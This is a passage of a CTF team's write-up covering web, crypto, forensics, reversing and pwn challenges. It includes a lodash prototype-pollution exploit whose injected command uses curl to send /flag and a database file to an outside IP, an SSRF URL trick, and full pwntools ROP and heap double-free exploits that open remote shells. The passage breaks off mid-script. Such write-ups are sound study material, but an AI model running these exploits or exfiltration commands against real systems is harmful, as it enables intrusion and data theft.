+<p>We are given a nodejs API which we can read/write the notes. Follow the instruction on the landing page and visit <code>/help</code>, and we can see a hidden file fetcher API:</p>
+<pre class="hljs"><code>{
+  <span class="hljs-attr">"API"</span>:<span class="hljs-string">"JS Fetcher, ver Beta"</span>,<span class="hljs-attr">"endpoints"</span>: [{
+      <span class="hljs-attr">"endpoint"</span>:<span class="hljs-string">"/fetchJSAPI/fetch"</span>,
+      <span class="hljs-attr">"method"</span>:<span class="hljs-string">"GET"</span>,
+      <span class="hljs-attr">"description"</span>:<span class="hljs-string">"Fetch a JS file and show it."</span>,
+      <span class="hljs-attr">"params"</span>:{<span class="hljs-attr">"path"</span>:<span class="hljs-string">"The file path"</span>}
+    }]
+}</code></pre><p>Okay, let&#39;s try to guess the filename of the server. Visiting <code>/fetchJSAPI/fetch/server.js</code>, it turns out the server is named <code>server.js</code>. Note that the param must end in <code>.js</code>. Otherwise the server will not return the file content.</p>
+<pre class="hljs"><code><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
+<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
+<span class="hljs-keyword">const</span> body_parser = <span class="hljs-built_in">require</span>(<span class="hljs-string">'body-parser'</span>);
+<span class="hljs-keyword">const</span> FileSync = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lowdb/adapters/FileSync'</span>)
+<span class="hljs-keyword">const</span> lowdb = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lowdb'</span>);
+
+<span class="hljs-keyword">const</span> adapter = <span class="hljs-keyword">new</span> FileSync(<span class="hljs-string">'db.json'</span>)
+<span class="hljs-keyword">const</span> db = lowdb(adapter)
+
+
+<span class="hljs-keyword">const</span> server = express();
+server.use(express.static(<span class="hljs-string">'public'</span>))
+server.set(<span class="hljs-string">'views'</span>, path.join(__dirname, <span class="hljs-string">'views'</span>));
+server.set(<span class="hljs-string">'view engine'</span>, <span class="hljs-string">'jade'</span>);
+server.listen(<span class="hljs-number">4000</span>)
+
+server.use(body_parser.json({ <span class="hljs-attr">type</span>: <span class="hljs-string">'application/*+json'</span> }))
+server.use(body_parser.urlencoded({ <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> }));
+
+<span class="hljs-keyword">var</span> routes = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./api/routes/routes'</span>);
+routes(server);
+
+server.get(<span class="hljs-string">'*'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, result</span>) </span>{
+    result.sendStatus(<span class="hljs-number">404</span>);
+    result.end()
+});</code></pre><p>The main script includes other routers in <code>./api/routes/routes</code>. However, most of the note API is not interesting because the <code>read-only</code> in <code>config.json</code> is set to true. We cannot create/delete a new note.  Here is the note router source code:</p>
+<pre class="hljs"><code><span class="hljs-meta">'use strict'</span>;
+<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
+<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>)
+<span class="hljs-keyword">const</span> uuid = <span class="hljs-built_in">require</span>(<span class="hljs-string">'uuid'</span>);
+<span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>);
+<span class="hljs-keyword">var</span> notes_model = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../models/notes_model'</span>);
+<span class="hljs-keyword">const</span> config = <span class="hljs-built_in">JSON</span>.parse(fs.readFileSync(path.join(__dirname, <span class="hljs-string">'../../config.json'</span>)))
+
+<span class="hljs-keyword">var</span> utilities = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../controllers/utilities'</span>);
+
+exports.fetch_all_notes = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>{
+    res.json(notes_model.notes.value());
+    res.end()
+};
+
+exports.fetch_a_note = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>{
+    <span class="hljs-keyword">var</span> data = notes_model.notes_data.find({ <span class="hljs-string">"id"</span>: req.params.noteId, <span class="hljs-string">"key"</span>: req.params.noteKey }).value(data)
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data === <span class="hljs-string">'undefined'</span>) {
+        res.json(utilities.send_result(<span class="hljs-literal">false</span>, <span class="hljs-string">"Either invalid node-data.id or node-data.key has been submitted."</span>));
+        res.end()
+    } <span class="hljs-keyword">else</span> {
+        res.json(utilities.send_result(<span class="hljs-literal">true</span>, <span class="hljs-string">"Authorization has been granted. The note has been fetched from database."</span>, data));
+        res.end()
+    }
+};
+
+exports.delete_a_note = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>{
+    <span class="hljs-keyword">if</span> (!config.read_only) {
+
+        <span class="hljs-keyword">var</span> data = notes_model.notes_data.remove({ <span class="hljs-string">"id"</span>: req.params.noteId, <span class="hljs-string">"key"</span>: req.params.noteKey }).write()
+
+        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Object</span>.keys(data).length) {
+            res.json(utilities.send_result(<span class="hljs-literal">false</span>, <span class="hljs-string">"Either invalid node-data.id or node-data.key has been submitted."</span>));
+            res.end()
+        } <span class="hljs-keyword">else</span> {
+            notes_model.notes.remove({ <span class="hljs-string">"id"</span>: req.params.noteId }).write()
+            res.json(utilities.send_result(<span class="hljs-literal">true</span>, <span class="hljs-string">"Authorization has been granted. The note has been deleted."</span>, { <span class="hljs-string">"data"</span>: data[<span class="hljs-number">0</span>].id }));
+            res.end()
+        }
+    }<span class="hljs-keyword">else</span>{
+        res.json(utilities.send_result(<span class="hljs-literal">false</span>, <span class="hljs-string">"This section is inactive duo to read-only mode."</span>,{}));
+    }
+};
+
+exports.make_a_note = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>{
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-string">'notedata'</span> <span class="hljs-keyword">in</span> req.body &amp;&amp; <span class="hljs-string">'0'</span> <span class="hljs-keyword">in</span> req.body.notedata) {
+        <span class="hljs-keyword">var</span> data_to_insert = req.body.notedata[<span class="hljs-number">0</span>]
+        <span class="hljs-keyword">if</span> (!(<span class="hljs-string">'owner'</span> <span class="hljs-keyword">in</span> data_to_insert) || !(<span class="hljs-string">'description'</span> <span class="hljs-keyword">in</span> data_to_insert) || !(<span class="hljs-string">'key'</span> <span class="hljs-keyword">in</span> data_to_insert) || !(<span class="hljs-string">'note'</span> <span class="hljs-keyword">in</span> data_to_insert)) {
+            <span class="hljs-keyword">var</span> data_to_insert = _.merge({ <span class="hljs-string">"owner"</span>: <span class="hljs-string">"BLANK"</span>, <span class="hljs-string">"description"</span>: <span class="hljs-string">"BLANK"</span>, <span class="hljs-string">"key"</span>: <span class="hljs-string">"BLANK"</span>, <span class="hljs-string">"note"</span>: <span class="hljs-string">"BLANK"</span> }, data_to_insert)
+        }
+
+        <span class="hljs-keyword">var</span> id = uuid()
+        <span class="hljs-keyword">var</span> notes_data_1 = { <span class="hljs-string">"id"</span>: id, <span class="hljs-string">"owner"</span>: data_to_insert.owner, <span class="hljs-string">"description"</span>: data_to_insert.description }
+        <span class="hljs-keyword">var</span> notes_data_2 = { <span class="hljs-string">"id"</span>: id, <span class="hljs-string">"key"</span>: data_to_insert.key, <span class="hljs-string">"note"</span>: data_to_insert.note }
+
+        <span class="hljs-keyword">if</span> (!config.read_only) {
+
+            notes_model.notes.push(notes_data1).write()
+            notes_model.notes_data.push(notes_data2).write()
+
+            res.json(utilities.send_result(<span class="hljs-literal">true</span>, <span class="hljs-string">"The note has been created."</span>, { <span class="hljs-string">"public"</span>: notes_data_1, <span class="hljs-string">"secret"</span>: notes_data_2 }));
+        } <span class="hljs-keyword">else</span> {
+            res.json(utilities.send_result(<span class="hljs-literal">false</span>, <span class="hljs-string">"The note has not been created duo to read-only mode."</span>, { <span class="hljs-string">"public"</span>: notes_data_1, <span class="hljs-string">"secret"</span>: notes_data_2 }));
+        }
+    } <span class="hljs-keyword">else</span> {
+        res.end()
+    }
+};</code></pre><p>In other APIs, the most suspicious one is <code>status</code>:</p>
+<pre class="hljs"><code><span class="hljs-meta">'use strict'</span>;
+
+<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>)
+<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
+<span class="hljs-keyword">const</span> { exec } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>);
+<span class="hljs-keyword">const</span> config = <span class="hljs-built_in">JSON</span>.parse(fs.readFileSync(path.join(__dirname, <span class="hljs-string">'../../config.json'</span>)))
+
+exports.get_gtatus = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>{
+    <span class="hljs-keyword">var</span> commands = {
+        <span class="hljs-string">"script-1"</span>: <span class="hljs-string">"uptime"</span>,
+        <span class="hljs-string">"script-2"</span>: <span class="hljs-string">"free -m"</span>
+    };
+
+    <span class="hljs-built_in">console</span>.log(commands)
+
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> index <span class="hljs-keyword">in</span> commands) {
+        exec(commands[index], (err, stdout, stderr) =&gt; {
+            <span class="hljs-keyword">if</span> (err) {
+                <span class="hljs-keyword">return</span>;
+            }
+
+            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`stdout: <span class="hljs-subst">${stdout}</span>`</span>);
+        });
+    }
+
+    res.send(<span class="hljs-string">'OK'</span>)
+    res.end()
+}
+
+exports.app_config = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>{
+
+    fs.readFile(config.app_root + <span class="hljs-string">'package.json'</span>, { <span class="hljs-attr">encoding</span>: <span class="hljs-string">'utf-8'</span> }, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, data</span>) </span>{
+        <span class="hljs-keyword">if</span> (!err) {
+            res.writeHead(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
+            res.write(data);
+            res.end();
+        }
+    })
+}</code></pre><p>It will execute those innocuous shell commands when visiting this API, but how to manipulate the hard-coded commands? The first thought comes to my mind is <a href="https://github.com/HoLyVieR/prototype-pollution-nsec18">javascript prototype polution</a>. If we can modify the prototype we can inject arbitrary command!</p>
+<p>The only thing we can control is through the note API. It use <code>lodash</code> to merge the note with empty one. Then I search the lodash vulnerability and find <a href="https://snyk.io/test/npm/lodash/4.17.4">this</a> interesting. It&#39;s just what we needed - Prototype Pollution.</p>
+<p>So the rest is trivial. Pollute the command object and get RCE of the server</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3                                                                                                 </span>
+<span class="hljs-keyword">import</span> json
+<span class="hljs-keyword">import</span> requests
+
+s = requests.session()
+data= {
+        <span class="hljs-string">"notedata"</span>: [{<span class="hljs-string">"__proto__"</span>: {<span class="hljs-string">"script-3"</span> : <span class="hljs-string">"curl 140.112.31.105:1234 -F 'a=@/flag' -F 'b=@/opt/db.json'"</span>, }}],
+}
+r = s.post(<span class="hljs-string">'http://162.243.23.15:8003/noteAPI/make_a_note'</span>, headers={<span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/javascript+json'</span>}, data=json.dumps(data))
+r = s.get(<span class="hljs-string">'http://162.243.23.15:8003/status'</span>)
+print(r.text)
+print(r.status_code)</code></pre><p>The remote server seems to have no <code>nc</code>, so I use curl to send the files.</p>
+<h4 id="falled-attempts"><a class="header-link" href="#falled-attempts"></a>Falled Attempts</h4>
+<ul class="list">
+<li><p>Trying to bypass the endswith <code>.js</code> check:</p>
+<pre class="hljs"><code>exports.fetch = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>{
+  <span class="hljs-keyword">var</span> file_path = req.params.path
+  <span class="hljs-keyword">var</span> arr = file_path.split(<span class="hljs-string">'.'</span>);
+
+  <span class="hljs-keyword">if</span> (arr.length &gt; <span class="hljs-number">1</span>) {
+      <span class="hljs-keyword">if</span> (arr[arr.length - <span class="hljs-number">1</span>] == <span class="hljs-string">'js'</span>) {
+          fs.readFile(config.js_dir + file_path, { <span class="hljs-attr">encoding</span>: <span class="hljs-string">'utf-8'</span> }, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, data</span>) </span>{
+              <span class="hljs-keyword">if</span> (!err) {
+                  res.writeHead(<span class="hljs-number">200</span>, { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/html'</span> });
+                  res.write(data);
+                  res.end();
+              } <span class="hljs-keyword">else</span> {
+                  res.setHeader(<span class="hljs-string">'JS-Files'</span>, <span class="hljs-string">'test.js'</span>)
+                  res.send(err)
+                  res.end();
+              }
+          });
+      } <span class="hljs-keyword">else</span> {
+          res.send(<span class="hljs-string">'Only .js files.'</span>);
+          res.end();
+      }
+  }<span class="hljs-keyword">else</span>{
+      res.send(<span class="hljs-string">'Only .js files.'</span>);
+      res.end();
+  }
+}</code></pre></li>
+</ul>
+<p>Although I can use percent-encoding <code>%2f</code> to send <code>/</code>, I can&#39;t bypass the file extension check.</p>
+<p>Actually I don&#39;t have other failled attempts. If you cannot come out of Prototype pollution, don&#39;t be disappointed. At least you learn something new :)</p>
+<h3 id="ssl-vpn"><a class="header-link" href="#ssl-vpn"></a>SSL-VPN</h3>
+<p>bookgin</p>
+<p>Unsolved, for the compelte writeup please refer to <a href="https://twitter.com/YShahinzadeh">@YShahinzadeh</a>&#39;s <a href="https://medium.com/@y.shahinzadeh/nodejs-ssrf-by-design-flaw-asis-final-2018-sslvpn-challenge-walkthrough-5ec4e87bcced">writeup</a></p>
+<p>Basically this is a SSRF challenge, using <code>@</code> to make the <code>google.com</code> part being interperted as HTTP Basic access authentication.</p>
+<pre class="hljs"><code><span class="hljs-symbol">http:</span><span class="hljs-comment">//google.com@127.0.0.1:12345/abc</span>
+
+<span class="hljs-comment">//send the request to 127.0.0.1:12345</span></code></pre><p>I get the db.json through visiting <code>http://162.243.23.15:8000/db.json/</code>. Just append a slash.</p>
+<p>It&#39;s silly I didn&#39;t solve this one, because I forget to try the empty string in the <code>path</code> parameter...... so I assume it must be <code>/</code>.</p>
+<h4 id="failed-attempts-1"><a class="header-link" href="#failed-attempts-1"></a>Failed Attempts</h4>
+<ul class="list">
+<li>CSRF injection in http module<ul class="list">
+<li>But the http module works well with <code>../</code>, so I think it&#39;s not the vulnerable version.</li>
+</ul>
+</li>
+<li>Gussing the other API in <code>http://162.243.23.15:8001</code><ul class="list">
+<li>Nothing interesting. The <code>echo</code> API even doesn&#39;t return anything if we access it directly.</li>
+</ul>
+</li>
+<li>Add the header <code>X-SSLVPN-Request-Id: 9B60:6E97:25ADB08:45E4D17:5AE34BA4</code> in the requests<ul class="list">
+<li>It&#39;s totally useless.</li>
+</ul>
+</li>
+</ul>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="made-by-baby"><a class="header-link" href="#made-by-baby"></a>Made by baby</h3>
+<p>FWEASD</p>
+<p>We are provided with an encrypted png and an encrypt script.
+Here is the encrypt function</p>
+<pre class="hljs"><code><span class="hljs-built_in">from</span> secret import <span class="hljs-built_in">exp</span>, key
+
+def <span class="hljs-built_in">encrypt</span>(<span class="hljs-built_in">exp</span>, <span class="hljs-built_in">num</span>, key):
+    assert key &gt;&gt; <span class="hljs-number">512</span> &lt;= <span class="hljs-number">1</span>
+    <span class="hljs-built_in">num</span> = <span class="hljs-built_in">num</span> + key
+    msg = bin(<span class="hljs-built_in">num</span>)[<span class="hljs-number">2</span>:][::<span class="hljs-number">-1</span>]
+    C, i = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>
+    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> msg:
+        C += int(b) * (<span class="hljs-built_in">exp</span>**i + (<span class="hljs-number">-1</span>)**i)
+        i += <span class="hljs-number">1</span>
+    <span class="hljs-keyword">try</span>:
+        enc = hex(C)[<span class="hljs-number">2</span>:].rstrip(<span class="hljs-string">'L'</span>).decode(<span class="hljs-string">'hex'</span>)
+    except:
+        enc = (<span class="hljs-string">'0'</span> + hex(C)[<span class="hljs-number">2</span>:].rstrip(<span class="hljs-string">'L'</span>)).decode(<span class="hljs-string">'hex'</span>)
+    <span class="hljs-literal">return</span> enc
+
+flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">'flag.png'</span>, <span class="hljs-string">'r'</span>).<span class="hljs-built_in">read</span>()
+msg = int(flag.encode(<span class="hljs-string">'hex'</span>), <span class="hljs-number">16</span>)
+enc = <span class="hljs-built_in">encrypt</span>(<span class="hljs-built_in">exp</span>, msg, key)
+
+f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'flag.enc'</span>, <span class="hljs-string">'w'</span>)
+f.<span class="hljs-built_in">write</span>(enc)
+f.<span class="hljs-built_in">close</span>()</code></pre><p>We can see that this function simply convert base-10 system to base-2 system, then interpret it as it is base-<code>exp</code> system, however, there are some more operation.</p>
+<ol class="list">
+<li>add <code>num</code>, which is <code>flag.png</code>, with a small number, <code>key</code>.</li>
+<li>multiply <code>num</code> by <code>exp</code>, since in <code>encrypt()</code>, <code>i</code> start with 1.</li>
+<li>add some small noise while interpreting base-2 system as it is base-<code>exp</code> system. </li>
+</ol>
+<p>So we can expect that, if we find the correct <code>exp</code>, and convert it to base-<code>exp</code> system, besides some low bits, most bits should 0 or 1.</p>
+<p>We first bruteforce to find that <code>exp</code> may be 3. Then ignore the noise added and recover it with the following script.</p>
+<pre class="hljs"><code># convert <span class="hljs-keyword">to</span> base-num <span class="hljs-built_in">system</span>
+def rep(<span class="hljs-keyword">x</span>, num):
+    <span class="hljs-keyword">ret</span> = []
+    <span class="hljs-keyword">while</span> num:
+        q = num % <span class="hljs-keyword">x</span>
+        num = num // <span class="hljs-keyword">x</span>
+        <span class="hljs-keyword">ret</span>.<span class="hljs-keyword">append</span>(q)
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">ret</span>
+
+
+<span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(<span class="hljs-string">'flag.enc'</span>, <span class="hljs-string">'r'</span>)
+flag = <span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>().encode(<span class="hljs-string">'hex'</span>)
+flag = <span class="hljs-keyword">int</span>(flag, <span class="hljs-number">16</span>)
+<span class="hljs-keyword">print</span> flag
+
+
+<span class="hljs-keyword">c</span> = <span class="hljs-number">0</span>
+i = <span class="hljs-number">1</span>
+<span class="hljs-keyword">ret</span> = rep(<span class="hljs-number">3</span>, flag)
+ans = <span class="hljs-string">''</span>
+<span class="hljs-keyword">print</span> <span class="hljs-keyword">ret</span>
+cnt = <span class="hljs-number">0</span>
+<span class="hljs-keyword">for</span> num in <span class="hljs-keyword">list</span>(reversed(<span class="hljs-keyword">ret</span>)):
+    cnt += <span class="hljs-number">1</span>
+    num = <span class="hljs-keyword">int</span>(num)
+    <span class="hljs-keyword">if</span> num == <span class="hljs-number">1</span>:
+        ans += <span class="hljs-string">'1'</span>
+    elif num == <span class="hljs-number">0</span>:
+        ans += <span class="hljs-string">'0'</span>
+    <span class="hljs-keyword">else</span>:
+        ans += <span class="hljs-string">'0'</span>
+<span class="hljs-keyword">try</span>:
+    pr = hex(<span class="hljs-keyword">int</span>(ans, <span class="hljs-number">2</span>) // <span class="hljs-number">2</span>)[<span class="hljs-number">2</span>:].rstrip(<span class="hljs-string">'L'</span>).decode(<span class="hljs-string">'hex'</span>)
+excep<span class="hljs-variable">t:</span>
+    pr = (<span class="hljs-string">'0'</span>+hex(<span class="hljs-keyword">int</span>(ans, <span class="hljs-number">2</span>) // <span class="hljs-number">2</span>)[<span class="hljs-number">2</span>:].rstrip(<span class="hljs-string">'L'</span>)).decode(<span class="hljs-string">'hex'</span>)
+<span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(<span class="hljs-string">'test.png'</span>, <span class="hljs-string">'w'</span>)
+<span class="hljs-keyword">f</span>.<span class="hljs-keyword">write</span>(pr)
+<span class="hljs-keyword">f</span>.<span class="hljs-keyword">close</span>()
+
+</code></pre><p>However the output can not be recognized by image reader, since the last chunk of png, a.k.a. <code>IEND</code>, is broken. Simply recover it by hand, change last 9 bytes of the png to <code>\x49\x45\x4e\x44\xae\x42\x60\x82\x0a</code>, then we can find an a little bit blurred flag.png.</p>
+<p>flag : <code>ASIS{n3w_g1f7_by_babymade_in_ASIS!!!}</code></p>
+<h2 id="forensic"><a class="header-link" href="#forensic"></a>Forensic</h2>
+<h3 id="red-bands"><a class="header-link" href="#red-bands"></a>Red Bands</h3>
+<p>FWEASD</p>
+<p>We are provided with some sparse bundle disk image. First unzip them to get bands with size 8MB. Now simply use <code>binwalk</code> on them and we can find that there exist some image in band <code>5</code>.
+Then <code>strings 5 | grep &quot;flag&quot;</code>, the output will show <code>flag.png</code>, apparently the flag is in band <code>5</code>. However after extract all image in band <code>5</code>, we can not found flag.
+After a little bit of struggle, we try <code>strings -n 3 5 | grep &quot;PNG&quot;</code>, the output : </p>
+<pre class="hljs"><code>PNG
+PNG
+PNG
+PNG</code></pre><p>However only two image is extracted by <code>binwalk -eM 5</code>, so we manually check headers by python, and found the third header of PNG is broken, it is <code>\x90PNG\r\n...</code> instead of <code>\x89PNG\r\n...</code>, simply fix it and extract, we got flag.</p>
+<p>Here is the exploit script</p>
+<pre class="hljs"><code>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'5'</span>, <span class="hljs-string">'rb'</span>)
+x = f.<span class="hljs-built_in">read</span>()
+f.<span class="hljs-built_in">close</span>()
+
+idx = <span class="hljs-number">0</span>
+<span class="hljs-built_in">while</span> <span class="hljs-number">1</span>:
+    place = x.<span class="hljs-built_in">find</span>(<span class="hljs-string">'PNG'</span>)
+    <span class="hljs-built_in">if</span> place &lt;= <span class="hljs-number">0</span>:
+        <span class="hljs-built_in">break</span>
+    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'_'</span> + str(idx) + <span class="hljs-string">'.png'</span>, <span class="hljs-string">'wb'</span>)
+    x = x[place:]
+    f.<span class="hljs-built_in">write</span>(<span class="hljs-string">'\x89'</span> + x)
+    f.<span class="hljs-built_in">close</span>()
+    x = x[<span class="hljs-number">3</span>:]
+    idx += <span class="hljs-number">1</span>
+</code></pre><p>flag : <code>ASIS{Mac_OS_X_Sp4rs3_Bundl3_D15k_iM49E__b4nds_Are_LOppY!}</code></p>
+<h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
+<h3 id="bit-square"><a class="header-link" href="#bit-square"></a>Bit square</h3>
+<p>FWEASD</p>
+<p>We are given two files : <code>bit_square</code>, <code>flag.enc</code>
+with <code>strace ./bit_square</code> we can see that it attempt to read <code>flag.png</code>, and write encrypted data into <code>flag.enc</code>
+Open <code>bit_square</code> in IDA, we found that in function <code>sub_2395</code>, it process the input image byte by byte, and all the operation are reversable, simply reverse them and we can recover the <code>flag.png</code>
+Exploit script : </p>
+<pre class="hljs"><code>f = open('flag.enc', 'r')
+x = [ord(i) for i in f.read()]
+cnt = 0
+idx = 0
+ans = ''
+<span class="hljs-comment"># we should first recover v9</span>
+<span class="hljs-comment"># we can achieve this since PNG files have specific header "\x89PNG"</span>
+v9 = 96
+while idx &lt; len(x):
+   <span class="hljs-built_in"> if </span>cnt % 4 == 0:
+        v8 = (x[idx] - 114) &amp; 0xff
+        v7 = x[idx+1]
+        ans += chr(v7 ^ v8 ^ ((v9+cnt) &amp; 0xff))
+        idx += 2
+    elif cnt % 4 == 1:
+        v7 = (x[idx] + 40) &amp; 0xff
+        v8 = x[idx+1]
+        ans += chr(v7 ^ v8 ^ ((v9+cnt) &amp; 0xff))
+        idx += 2
+    elif cnt % 4 == 2:
+        v6 = cnt ** 3
+       <span class="hljs-built_in"> if </span>v6 &gt; 0x27:
+            v8 = x[idx]
+            v7 = x[idx+1]
+        else:
+            v7 = x[idx]
+            v8 = x[idx+1]
+        ans += chr(v7 ^ v8 ^ ((v9+cnt) &amp; 0xff))
+        idx += 3
+    else:
+        v7 = x[idx]
+        v8 = x[idx+1]
+        ans += chr(v7 ^ v8 ^ ((v9+cnt) &amp; 0xff))
+        idx += 3
+    cnt += 1
+f = open('origin.png', 'w')
+f.write(ans)
+f.close()</code></pre><p>flag : <code>ASIS{3Xpla1n_h0w_it5_funnY$$$}</code></p>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="inception"><a class="header-link" href="#inception"></a>Inception</h3>
+<p>FWEASD</p>
+<p>This is a simple ROP chal with multithread.
+It spawn a child thread, and the main thread wait until child thread send &quot;TRANSMISSION_OVER\x00&quot;, the child thread will read a string, and if <code>!strcmp(&quot;ASIS{N0T_R34LLY_4_FL4G}&quot;, input_string, )</code>, it will write user controlled buffer that can overflow main thread to main thread.
+In both main thread and child thread can overwrite return address. However in child thread we can only use</p>
+<ol class="list">
+<li>sys_read</li>
+<li>sys_write</li>
+<li>sys_close</li>
+<li>sys_exit</li>
+<li>sys_exit_group</li>
+</ol>
+<p>Apparently we have to get shell in main thread, so I leak libc in child thread and write one_gadget to main thread&#39;s return address.
+Exploit script :</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python</span>
+from pwn import *
+
+host = '37.139.17.37'
+port = 1338
+
+r = remote(host, port)
+
+context.arch = 'amd64'
+
+buf = 0x603000
+
+write_plt = 0x400890
+puts_plt = 0x0000000000400880
+read_plt = 0x4008e0
+puts_got = 0x0000000000602028
+
+pop_rsi_r15 = 0x0000000000400cf1
+pop_rdi = 0x0000000000400cf3
+
+main_read = 0x400bb7
+main_exit = 0x400c31
+
+puts_base = 0x00000000000809c0
+pop_rdx = 0x0000000000001b96
+one_gadget = 0x4f322
+
+r.recvuntil(':')
+payload = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(0x20, 'a')
+payload += flat([buf-0x200, pop_rdi, puts_got, puts_plt, main_read])
+r.sendline(payload)
+r.recvuntil('Yeah tha')
+libc = u64(r.recvn(6).ljust(8, '\x00')) - puts_base
+print ('libc : ', hex(libc))
+pop_rdx += libc
+print ('pop_rdx : ', hex(pop_rdx))
+one_gadget += libc
+print ('one_gadget : ', hex(one_gadget))
+
+
+time.sleep(1)
+payload = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(0x20, 'a')
+payload += flat([buf-0x400, pop_rdi, 0, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, read_plt, pop_rdi, 10, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, write_plt, main_exit])
+r.sendline(payload)
+
+time.sleep(1)
+payload = 'TRANSMISSION_OVER\x00'.ljust(0x28, 'a')
+payload += flat([one_gadget])
+r.sendline(payload)
+r.interactive()</code></pre><p>flag : <code>ASIS{2655b2e6fa6861246c9423c75d76c0e3}</code></p>
+<h3 id="asvdb"><a class="header-link" href="#asvdb"></a>Asvdb</h3>
+<p>FWEASD</p>
+<p>In this chal we can </p>
+<ol class="list">
+<li>add bug, which will allocate a bug struct</li>
+<li>free bug, which will free(title) -&gt; free(description) -&gt; free(bug) -&gt; clear pointer to bug</li>
+<li>show bug, which will print all the content in a bug struct<pre class="hljs"><code><span class="hljs-comment">// malloc(0x20)</span>
+<span class="hljs-keyword">struct</span> bug{
+ <span class="hljs-keyword">int</span> year;
+ <span class="hljs-keyword">int</span> id;
+ <span class="hljs-keyword">char</span> *title = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);
+ <span class="hljs-keyword">char</span> *description = <span class="hljs-built_in">malloc</span>(size);
+ <span class="hljs-keyword">int</span> severity;
+};</code></pre>we can input the <code>size</code>, if it smaller than 1 or it is bigger than 0xff, the <code>bug</code> will still be allocate, however the <code>description</code> pointer won&#39;t be overwrite. Then we can call free to trigger double free, thus we can do fast bin dup attack.
+Additionally, this is deployed in Ubuntu18.04, which use tcache, so we can simply malloc to arbitary place. I malloc to <code>__free_hook</code> and overwrite it with a buf address, and the buf&#39;s content is <code>&quot;/bin/sh\x00&quot;</code>, then trigger free to get shell.</li>
+</ol>
+<p>Exploit script : </p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn import *
+
+host = <span class="hljs-string">'37.139.17.37'</span>
+port = <span class="hljs-number">1337</span>
+
+context.arch = <span class="hljs-string">'amd64'</span>
+r = remote(host, port)
+
+def <span class="hljs-keyword">add</span><span class="bash">(year, id, title, size, description, severity):
+</span>    r.recvuntil(<span class="hljs-string">'&gt;'</span>)
+    r.sendline(<span class="hljs-string">'1'</span>)
+    r.recvuntil(<span class="hljs-string">':'</span>)
+    r.sendline(str(year))
+    r.recvuntil(<span class="hljs-string">':'</span>)
+    r.sendline(str(id))
+    r.recvuntil(<span class="hljs-string">':'</span>)
+    if len(title) == <span class="hljs-number">63</span>:
+        r.send(title)
+    else:
+        r.sendline(title)
+    r.recvuntil(<span class="hljs-string">':'</span>)
+    r.sendline(str(size))
+    r.recvuntil(<span class="hljs-string">':'</span>)
+    if size == <span class="hljs-number">0</span>:
+        pass
+    elif len(description) &gt;= size - <span class="hljs-number">1</span>:
+        r.send(description)
+    else:
+        r.sendline(description)
+    r.recvuntil(<span class="hljs-string">':'</span>)
+    r.sendline(str(severity))
+
+def free(idx):
+    r.recvuntil(<span class="hljs-string">'&gt;'</span>)
+    r.sendline(<span class="hljs-string">'3'</span>)
+    r.recvuntil(<span class="hljs-string">':'</span>)
+    r.sendline(str(idx))
+
+def show(idx):
